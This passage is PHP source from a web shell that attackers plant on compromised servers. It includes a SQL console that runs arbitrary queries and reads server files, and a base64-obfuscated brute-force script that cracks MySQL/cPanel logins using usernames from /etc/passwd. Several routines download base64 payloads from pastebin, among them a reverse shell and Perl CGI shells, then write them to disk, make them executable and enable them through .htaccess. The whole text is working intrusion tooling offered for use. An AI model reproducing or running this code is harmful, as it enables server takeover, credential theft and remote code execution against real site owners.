else $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';
echo "<br><br>"; } if ((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
$db->query(@$_POST['p2']);
if ($db->res !== false) { $title = false; echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">'; $line = 1; while ($item = $db->fetch()) {
if (!$title) { echo '<tr>'; foreach ($item as $key => $value) echo '<th>' . $key . '</th>'; reset($item); $title = true; echo '</tr><tr>'; $line = 2;
}
echo '<tr class="l' . $line . '">';
$line = $line == 1 ? 2 : 1;
foreach ($item as $key => $value) { if ($value == null) echo '<td><i>null</i></td>'; else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
}
echo '</tr>'; } echo '</table>';
} else { echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
} } echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>"; if (!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']); echo "</textarea><br/><input type=submit value='Execute'>"; echo "</td></tr>";
}
echo "</table></form><br/>";
if ($_POST['type'] == 'mysql') { $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'"); if ($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
}
if (@$_POST['p1'] == 'loadfile') { $file = $db->loadFile($_POST['p2']); echo '<pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
} } else {
echo htmlspecialchars($db->error()); } echo '</div>'; yemenfooter();
}
function yemenbf() {
	yemenhead();
	$cp1 = 'PD9waHANCkBzZXRfdGltZV9saW1pdCgwKTsNCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQplY2hvICcNCjxoZWFkPg0KDQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KYm9keSB7DQoJYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsNCiAgICBmb250LXNpemU6IDE4cHg7DQoJY29sb3I6ICNjY2NjY2M7DQp9DQppbnB1dCx0ZXh0YXJlYSxzZWxlY3R7DQpmb250LXdlaWdodDogYm9sZDsNCmNvbG9yOiAjY2NjY2NjOw0KZGFzaGVkICNmZmZmZmY7DQpib3JkZXI6IDFweA0Kc29saWQgIzJDMkMyQzsNCmJhY2tncm91bmQtY29sb3I6ICMwODA4MDgNCn0NCmEgew0KCWJhY2tncm91bmQtY29sb3I6ICMxNTE1MTU7DQoJdmVydGljYWwtYWxpZ246IGJvdHRvbTsNCgljb2xvcjogIzAwMDsNCgl0ZXh0LWRlY29yYXRpb246IG5vbmU7DQoJZm9udC1zaXplOiAyMHB4Ow0KCW1hcmdpbjogOHB4Ow0KCXBhZGRpbmc6IDZweDsNCglib3JkZXI6IHRoaW4gc29saWQgIzAwMDsNCn0NCmE6aG92ZXIgew0KCWJhY2tncm91bmQtY29sb3I6ICMwODA4MDg7DQoJdmVydGljYWwtYWxpZ246IGJvdHRvbTsNCgljb2xvcjogIzMzMzsNCgl0ZXh0LWRlY29yYXRpb246IG5vbmU7DQoJZm9udC1zaXplOiAyMHB4Ow0KCW1hcmdpbjogOHB4Ow0KCXBhZGRpbmc6IDZweDsNCglib3JkZXI6IHRoaW4gc29saWQgIzAwMDsNCn0NCi5zdHlsZTEgew0KCXRleHQtYWxpZ246IGNlbnRlcjsNCn0NCi5zdHlsZTIgew0KCWNvbG9yOiAjRkZGRkZGOw0KCWZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KLnN0eWxlMyB7DQoJY29sb3I6ICNGRkZGRkY7DQp9DQotLT4NCjwvc3R5bGU+DQoNCjwvaGVhZD4NCic7DQpmdW5jdGlvbiBpbigkdHlwZSwkbmFtZSwkc2l6ZSwkdmFsdWUsJGNoZWNrZWQ9MCkgDQp7DQokcmV0ID0gIjxpbnB1dCB0eXBlPSIuJHR5cGUuIiBuYW1lPSIuJG5hbWUuIiAiO2lmKCRzaXplICE9IDApIA0Kew0KJHJldCAuPSAic2l6ZT0iLiRzaXplLiIgIjt9DQokcmV0IC49ICJ2YWx1ZT1cIiIuJHZhbHVlLiJcIiI7aWYoJGNoZWNrZWQpICRyZXQgLj0gIiBjaGVja2VkIjtyZXR1cm4gJHJldC4iPiI7fQ0KZWNobyAiPGJyPjx0aXRsZT5CcnV0ZSBGb3JjZSBCeSBNb25kczwvdGl0bGU+PGZvcm0gbmFtZT1mb3JtIG1ldGhvZD1QT1NUPiI7DQplY2hvIGluKCdoaWRkZW4nLCdkYicsMCwkX1BPU1RbJ2RiJ10pO2VjaG8gaW4oJ2hpZGRlbicsJ2RiX3NlcnZlcicsMCwkX1BPU1RbJ2RiX3NlcnZlciddKTtlY2hvIGluKCdoaWRkZW4nLCdkYl9wb3J0JywwLCRfUE9TVFsnZGJfcG9ydCddKTtlY2hvIGluKCdoaWRkZW4nLCdteXNxbF9sJywwLCRfUE9TVFsnbXlzcWxfbCddKTtlY2hvIGluKCdoaWRkZW4nLCdteXNxbF9wJywwLCRfUE9TVFsnbXlzcWxfcCddKTtlY2hvIGluKCdoaWRkZW4nLCdteXNxbF9kYicsMCwkX1BPU1RbJ215c3FsX2RiJ10pO2VjaG8gaW4oJ2hpZGRlbicsJ2NjY2MnLDAsJ2RiX3F1ZXJ5Jyk7DQoNCmlmKCRfUE9TVFsncGFnZSddPT0nZmluZCcpDQp7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJuYW1lcyddKSAmJmlzc2V0KCRfUE9TVFsncGFzc3dvcmRzJ10pKQ0Kew0KaWYoJF9QT1NUWyd0eXBlJ10gPT0gJ3Bhc3N3ZCcpew0KJGUgPSBleHBsb2RlKCJcbiIsJF9QT1NUWyd1c2VybmFtZXMnXSk7DQpmb3JlYWNoKCRlIGFzICR2YWx1ZSl7DQokayA9IGV4cGxvZGUoIjoiLCR2YWx1ZSk7DQokdXNlcm5hbWUgLj0gJGtbJzAnXS4iICI7DQp9DQp9ZWxzZWlmKCRfUE9TVFsndHlwZSddID09ICdzaW1wbGUnKXsNCiR1c2VybmFtZSA9IHN0cl9yZXBsYWNlKCJcbiIsJyAnLCRfUE9TVFsndXNlcm5hbWVzJ10pOw0KfQ0KJGExID0gZXhwbG9kZSgiICIsJHVzZXJuYW1lKTsNCiRhMiA9IGV4cGxvZGUoIlxuIiwkX1BPU1RbJ3Bhc3N3b3JkcyddKTsNCiRpZDIgPSBjb3VudCgkYTIpOw0KJG9rID0gMDsNCmZvcmVhY2goJGExIGFzICR1c2VyICkNCnsNCmlmKCR1c2VyICE9PSAnJykNCnsNCiR1c2VyPXRyaW0oJHVzZXIpOw0KZm9yKCRpPTA7JGk8PSRpZDI7JGkrKykNCnsNCiRwYXNzID0gdHJpbSgkYTJbJGldKTsNCmlmKEBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCR1c2VyLCRwYXNzKSkNCnsNCmVjaG8gIkJMQUNLfiB1c2VyIGlzICg8Yj48Zm9udCBjb2xvcj1ncmVlbj4kdXNlcjwvZm9udD48L2I+KSBQYXNzd29yZCBpcyAoPGI+PGZvbnQgY29sb3I9Z3JlZW4+JHBhc3M8L2ZvbnQ+PC9iPik8YnIgLz4iOw0KJG9rKys7DQp9DQp9DQp9DQp9DQplY2hvICI8aHI+PGI+WW91IEZvdW5kIDxmb250IGNvbG9yPWdyZWVuPiRvazwvZm9udD4gQ3BhbmVsIEJ5IEJMQUNLIFNjcmlwdCBOYW1lPC9iPiI7DQplY2hvICI8Y2VudGVyPjxiPjxhIGhyZWY9Ii4kX1NFUlZFUlsnUEhQX1NFTEYnXS4iPkJBQ0s8L2E+IjsNCmV4aXQ7DQp9DQp9DQo7ZWNobyAnDQoNCg0KDQo8Zm9ybSBtZXRob2Q9IlBPU1QiIHRhcmdldD0iX2JsYW5rIj4NCgk8c3Ryb25nPg0KPGlucHV0IG5hbWU9InBhZ2UiIHR5cGU9ImhpZGRlbiIgdmFsdWU9ImZpbmQiPiAgICAgICAgCQkJCQ0KICAgIDwvc3Ryb25nPg0KICAgIDx0YWJsZSB3aWR0aD0iNjAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+DQogICAgPHRyPg0KICAgICAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiPjxjZW50ZXI+PGJyPg0KCQk8L3N0cm9uZz4NCgkJPGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21vbmRzLmhhY2tlcnMiIGNsYXNzPSJzdHlsZTIiPjxzdHJvbmc+RGV2ZWxvcGVkIEJ5IA0KPGZvbnQgY29sb3I9IiNGRjAwMDAiPk1vbmRzPC9mb250Pjwvc3Ryb25nPjwvYT48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+PC9jZW50ZXI+PC90ZD48L2ZvbnQ+DQogICAgPC90cj4NCiAgICA8dHI+DQogICAgPHRkPg0KICAgIDx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjEiIGFsaWduPSJjZW50ZXIiPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY2xhc3M9InN0eWxlMiIgc3R5bGU9IndpZHRoOiAxMzlweCI+DQoJPHN0cm9uZz5Vc2VyIDo8L3N0cm9uZz48L3RkPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+PHN0cm9uZz48dGV4dGFyZWEgY29scz0iNDAiIHJvd3M9IjEwIiBuYW1lPSJ1c2VybmFtZXMiPjwvdGV4dGFyZWE+PC9zdHJvbmc+PC90ZD4NCiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTIiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPg0KCTxzdHJvbmc+UGFzcyA6PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPjxzdHJvbmc+PHRleHRhcmVhIGNvbHM9IjQwIiByb3dzPSIxMCIgbmFtZT0icGFzc3dvcmRzIj48L3RleHRhcmVhPjwvc3Ryb25nPjwvdGQ+DQogICAgPC90cj4NCiAgICA8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjbGFzcz0ic3R5bGUyIiBzdHlsZT0id2lkdGg6IDEzOXB4Ij4NCgk8c3Ryb25nPlR5cGUgOjwvc3Ryb25nPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij4NCiAgICA8c3BhbiBjbGFzcz0ic3R5bGUyIj48c3Ryb25nPlNpbXBsZSA6IDwvc3Ryb25nPiA8L3NwYW4+DQoJPHN0cm9uZz4NCgk8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InR5cGUiIHZhbHVlPSJzaW1wbGUiIGNoZWNrZWQ9ImNoZWNrZWQiIGNsYXNzPSJzdHlsZTMiPjwvc3Ryb25nPg0KICAgIDxmb250IGNsYXNzPSJzdHlsZTIiPjxzdHJvbmc+L2V0Yy9wYXNzd2QgOiA8L3N0cm9uZz4gPC9mb250Pg0KCTxzdHJvbmc+DQoJPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJ0eXBlIiB2YWx1ZT0icGFzc3dkIiBjbGFzcz0ic3R5bGUzIj48L3N0cm9uZz48c3BhbiBjbGFzcz0ic3R5bGUzIj48c3Ryb25nPg0KCTwvc3Ryb25nPg0KCTwvc3Bhbj4NCiAgICA8L3RkPg0KICAgIDwvdHI+DQogICAgPHRyPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgc3R5bGU9IndpZHRoOiAxMzlweCI+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPjxzdHJvbmc+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9InN0YXJ0Ij4NCiAgICA8L3N0cm9uZz4NCiAgICA8L3RkPg0KICAgIDx0cj4NCjwvZm9ybT4gICAgDQogICAgDQogICAgDQogICANCic7DQppZigkX1BPU1RbJ2F0dCddPT1udWxsKQ0Kew0KZWNobyAnCQkJCQkJICc7DQp9ZWxzZXsNCmVjaG8gIgkJCQkJCSANCgkJCQkJCSANCiI7DQp9';
	$file = fopen("cpanel.php", "w+");
	$file = fopen("cpanel.php", "w+");
	$write = fwrite($file, base64_decode($cp1));
	fclose($file);
	echo '<iframe src="cpanel.php" style="height:500px; width:1500px; border:0px;" name="brute">';
	yemenfooter();
}
function yemenrev() {
	$reverse = file_get_contents('http://pastebin.com/raw.php?i=8AxYU3Rd');
	$file = fopen("rev.php", "w+");
	$write = fwrite($file, base64_decode($reverse));
	fclose($file);
	yemenhead(); 
	echo '<iframe src="rev.php" style="height:500px; width:500px; border:0px;" name="reverse">';
	yemenfooter();
}
function yemenconpass() {
 yemenhead(); 
 echo '<center><embed  src="http://nyccah.rayogram.com/3Turr" style="height:250px; width:99%; border:4px solid #ccc;;" name="conpass" ></embed></center>';
 yemenfooter();
}
function yemenperl() {
	mkdir('cgirun', 0755);
	chdir('cgirun');
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi, 'w') or die("khong the tao shell!");
	$metin = "AddHandler cgi-script .pr";
	fwrite($dosya, $metin);
	fclose($dosya);
	$cgico = @file_get_contents('http://pastebin.com/raw.php?i=7xJptQEY');
	$file = fopen("cgi.pr", "w+");
	$write = fwrite($file, base64_decode($cgico));
	fclose($file);
	chmod("cgi.pr", 0755);
	yemenhead();
	echo '<iframe src="cgirun/cgi.pr" style="height:500px; width:1000px; border:0px;" name="config">';
}
function yemenperl4() {
	mkdir('cgirun', 0755);
	chdir('cgirun');
	$dosya = fopen('.htaccess', 'w') or die("Do it manually !");
	$metin = "AddHandler cgi-script .pr";
	fwrite($dosya, $metin);
	fclose($dosya);
	$cgico = file_get_contents('http://pastebin.com/raw.php?i=hsMFJvrK');
	$file = fopen("cgi4.pr", "w+");
	$write = fwrite($file, base64_decode($cgico));
	fclose($file);
	chmod("cgi4.pr", 0755);
	yemenhead();
	echo '<iframe src="cgirun/cgi4.pr" style="height:500px; width:1000px; border:0px;" name="config">';
}
function yemenzone() {
	yemenhead();
	$zone1 = file_get_contents('http://pastebin.com/raw.php?i=jwz4TeZq');
	$file = fopen("zone.php", "w+");
	$write = fwrite($file, base64_decode($zone1));
	fclose($file);
	echo '<iframe src="zone.php" style="height:500px; width:1500px; border:0px;" name="zone">';
	yemenfooter();
}
function yemenzonejoy() {
	yemenhead();
	$zone1 = file_get_contents('http://pastebin.com/raw.php?i=aLsyUHdu');
	$file = fopen("zonejoy.php", "w+");
	$write = fwrite($file, base64_decode($zone1));
	fclose($file);
	echo '<iframe src="zonejoy.php" style="height:500px; width:1500px; border:0px;" name="zonejoy" />>';
	yemenfooter();
}
function yemenzip() {
	yemenhead();
	$zip1 = file_get_contents('http://pastebin.com/raw.php?i=bTR5Pb38');
	$file = fopen("zip.php", "w+");
	$write = fwrite($file, base64_decode($zip1));
	fclose($file);
	echo '<iframe src="zip.php" style="height:500px; width:1500px; border:0px;" name="zip">';
	yemenfooter();
}
if (empty($_POST['a'])) if (isset($default_action) && function_exists('yemen' . $default_action)) $_POST['a'] = $default_action;
else $_POST['a'] = 'FilesMan';
if (!empty($_POST['a']) && function_exists('yemen' . $_POST['a'])) call_user_func('yemen' . $_POST['a']);
exit;
